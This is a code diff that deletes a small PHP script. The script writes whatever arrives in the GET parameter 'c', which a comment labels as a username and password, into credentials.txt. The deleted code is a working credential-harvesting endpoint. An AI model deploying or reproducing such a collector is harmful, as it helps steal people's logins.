@@ -1,8 +1,0 @@
-<?php
-    $outputString = print_r($_GET['c'], true); //"Username: ".$_GET['c']." Password: ".$_GET['c']."\n";
-    $result = file_put_contents('credentials.txt', $outputString, FILE_APPEND);
-    $f = fopen("credentials.txt", "w");
-    fwrite($f, $outputString);
-    fclose($f);
-    //die($outputString." ".$result);
-?>
